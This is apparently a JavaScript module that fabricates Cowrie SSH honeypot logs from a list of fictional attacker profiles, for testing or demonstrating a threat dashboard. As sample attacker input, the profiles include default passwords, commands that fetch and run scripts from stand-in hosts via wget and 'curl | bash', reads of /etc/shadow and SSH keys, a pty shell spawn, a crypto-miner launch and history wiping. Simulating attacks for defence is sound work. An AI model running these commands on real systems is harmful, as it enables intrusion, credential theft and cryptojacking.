const correlation = require('./correlation');

// Curated list of realistic worldwide public IPs + User's Local IP
const THREAT_ACTORS = [
  {
    ip: '104.244.42.1',
    label: 'US Cloud VPS Scanner',
    client: 'SSH-2.0-libssh_0.9.5',
    username: 'admin',
    passwords: ['admin123', 'toor', 'password'],
    commands: ['whoami', 'uname -a', 'id', 'cat /etc/issue', 'df -h'],
    downloads: [],
    successfulLogin: true,
    risk: 'HIGH'
  },
  {
    ip: '95.173.136.241',
    label: 'RU Botnet Malware Dropper',
    client: 'SSH-2.0-OpenSSH_7.4',
    username: 'root',
    passwords: ['root', '123456'],
    commands: ['uname -m', 'wget http://c2.botnet-drop.ru/sh.sh', 'chmod 777 sh.sh', './sh.sh', 'rm -f sh.sh'],
    downloads: [{ url: 'http://c2.botnet-drop.ru/sh.sh', outfile: '/tmp/sh.sh', shasum: 'a38f9210c48e83b271d9990812' }],
    successfulLogin: true,
    risk: 'CRITICAL'
  },
  {
    ip: '185.220.101.5',
    label: 'DE Tor Exit Credential Harvester',
    client: 'SSH-2.0-PuTTY_Release_0.76',
    username: 'root',
    passwords: ['admin', 'toor', 'root123', 'server'],
    commands: ['cat /etc/shadow', 'cat /etc/passwd', 'cat /root/.ssh/authorized_keys'],
    downloads: [],
    successfulLogin: true,
    risk: 'CRITICAL'
  },
  {
    ip: '103.235.46.39',
    label: 'HK / CN Automated Prober',
    client: 'SSH-2.0-Go',
    username: 'oracle',
    passwords: ['oracle', 'oracle123', 'manager'],
    commands: ['ps aux', 'netstat -antup', 'lsof -i :22'],
    downloads: [],
    successfulLogin: true,
    risk: 'MEDIUM'
  },
  {
    ip: '177.136.248.8',
    label: 'BR IoT Telnet/SSH Worm',
    client: 'SSH-2.0-Mirai_v2',
    username: 'support',
    passwords: ['support', 'default', '1234'],
    commands: [],
    downloads: [],
    successfulLogin: false,
    risk: 'LOW'
  },
  {
    ip: '133.242.18.23',
    label: 'JP Masscan Probe',
    client: 'SSH-2.0-OpenSSH_8.2p1',
    username: 'user',
    passwords: ['123456', 'password'],
    commands: ['uptime'],
    downloads: [],
    successfulLogin: false,
    risk: 'LOW'
  },
  {
    ip: '51.15.100.20',
    label: 'NL Scaleway Reverse Shell',
    client: 'SSH-2.0-OpenSSH_8.9p1',
    username: 'root',
    passwords: ['toor', 'root'],
    commands: ['whoami', 'python3 -c "import pty; pty.spawn(\'/bin/sh\')"', 'cat /etc/passwd'],
    downloads: [],
    successfulLogin: true,
    risk: 'HIGH'
  },
  {
    ip: '81.2.69.142',
    label: 'GB Automated Scripting Attacker',
    client: 'SSH-2.0-AsyncSSH_2.5.0',
    username: 'deploy',
    passwords: ['deploy', 'production'],
    commands: ['curl -s http://raw.githubusercontent.com/recon/run.sh | bash'],
    downloads: [{ url: 'http://raw.githubusercontent.com/recon/run.sh', outfile: '/tmp/run.sh', shasum: 'e492819fbc7412e8b09c11812' }],
    successfulLogin: true,
    risk: 'HIGH'
  },
  {
    ip: '39.40.10.25',
    label: 'PK Remote Recon Node',
    client: 'SSH-2.0-OpenSSH_9.0',
    username: 'test',
    passwords: ['test1234', 'test'],
    commands: ['hostname', 'ifconfig', 'route -n'],
    downloads: [],
    successfulLogin: false,
    risk: 'LOW'
  },
  {
    ip: '113.161.72.10',
    label: 'VN Crypto-Miner Dropper',
    client: 'SSH-2.0-libssh-0.8.4',
    username: 'root',
    passwords: ['123456', 'root'],
    commands: ['cat /proc/cpuinfo', 'wget http://xmr-pool.vn/xmrig', 'chmod +x xmrig', './xmrig -o stratum+tcp://xmr.pool:3333'],
    downloads: [{ url: 'http://xmr-pool.vn/xmrig', outfile: '/tmp/xmrig', shasum: '7b8921afcb123e4590219c01' }],
    successfulLogin: true,
    risk: 'CRITICAL'
  },
  {
    ip: '212.175.14.3',
    label: 'TR High-Speed SSH Dictionary Attack',
    client: 'SSH-2.0-Hydra_v9.2',
    username: 'root',
    passwords: ['123456', 'password', '12345678', 'admin', 'qwerty', '123123', 'root123'],
    commands: [],
    successfulLogin: false,
    risk: 'MEDIUM'
  },
  {
    ip: '188.166.240.1',
    label: 'SG DigitalOcean Scanner',
    client: 'SSH-2.0-OpenSSH_7.9',
    username: 'guest',
    passwords: ['guest123'],
    commands: [],
    downloads: [],
    successfulLogin: false,
    risk: 'LOW'
  },
  {
    ip: '192.168.100.11',
    label: 'Local LAN Analyst Workstation',
    client: 'SSH-2.0-OpenSSH_9.6 (User LAN Audit)',
    username: 'faizan',
    passwords: ['audit_test_pass'],
    commands: ['whoami', 'uname -a', 'netstat -tuln', 'cat /etc/os-release'],
    downloads: [],
    successfulLogin: true,
    risk: 'MEDIUM'
  },
  {
    ip: '175.29.58.220',
    label: 'Real IP Test (Pakistan)',
    client: 'SSH-2.0-OpenSSH_8.4p1',
    username: 'admin',
    passwords: ['admin123', 'root', '123456'],
    commands: ['cat /etc/passwd', 'history -c'],
    downloads: [],
    successfulLogin: true,
    risk: 'HIGH'
  }
];

function generateRandomThreatEvents() {
  const generatedEvents = [];
  const now = Date.now();

  THREAT_ACTORS.forEach((actor, index) => {
    const sessionId = Math.random().toString(36).substring(2, 14);
    const sessionTimeOffset = (THREAT_ACTORS.length - index) * 4 * 60 * 1000;
    const sessionStartTime = new Date(now - sessionTimeOffset).toISOString();
    let currentTimestamp = new Date(sessionStartTime).getTime();

    const events = [];

    events.push({
      eventid: 'cowrie.session.connect',
      src_ip: actor.ip,
      src_port: 40000 + Math.floor(Math.random() * 20000),
      dst_ip: '192.168.100.11',
      dst_port: 22,
      session: sessionId,
      timestamp: new Date(currentTimestamp).toISOString(),
      message: `Connection from ${actor.ip} on honeypot port 22`
    });

    currentTimestamp += 800;
    events.push({
      eventid: 'cowrie.client.version',
      src_ip: actor.ip,
      version: actor.client,
      session: sessionId,
      timestamp: new Date(currentTimestamp).toISOString(),
      message: `Remote SSH version: ${actor.client}`
    });

    actor.passwords.forEach((pass, pIdx) => {
      currentTimestamp += 1200;
      const isSuccess = actor.successfulLogin && (pIdx === actor.passwords.length - 1);
      events.push({
        eventid: isSuccess ? 'cowrie.login.success' : 'cowrie.login.failed',
        src_ip: actor.ip,
        username: actor.username,
        password: pass,
        session: sessionId,
        timestamp: new Date(currentTimestamp).toISOString(),
        message: isSuccess ? 'Login successful' : 'Login failed'
      });
    });

    if (actor.successfulLogin && actor.commands.length > 0) {
      actor.commands.forEach(cmd => {
        currentTimestamp += 2500;
        events.push({
          eventid: 'cowrie.command.input',
          src_ip: actor.ip,
          input: cmd,
          session: sessionId,
          timestamp: new Date(currentTimestamp).toISOString(),
          message: `Command executed: ${cmd}`
        });
      });
    }

    if (actor.downloads && actor.downloads.length > 0) {
      actor.downloads.forEach(dl => {
        currentTimestamp += 3000;
        events.push({
          eventid: 'cowrie.session.file_download',
          src_ip: actor.ip,
          url: dl.url,
          outfile: dl.outfile,
          shasum: dl.shasum,
          size: 5000,
          session: sessionId,
          timestamp: new Date(currentTimestamp).toISOString(),
          message: `File downloaded: ${dl.outfile}`
        });
      });
    }

    currentTimestamp += 1500;
    events.push({
      eventid: 'cowrie.session.closed',
      src_ip: actor.ip,
      duration: Math.round((currentTimestamp - new Date(sessionStartTime).getTime()) / 1000),
      session: sessionId,
      timestamp: new Date(currentTimestamp).toISOString(),
      message: `Connection closed from ${actor.ip}`
    });

    events.forEach(e => {
        e.is_simulated = true;
        generatedEvents.push(e);
    });
  });

  return generatedEvents;
}

module.exports = {
  THREAT_ACTORS,
  generateRandomThreatEvents
};
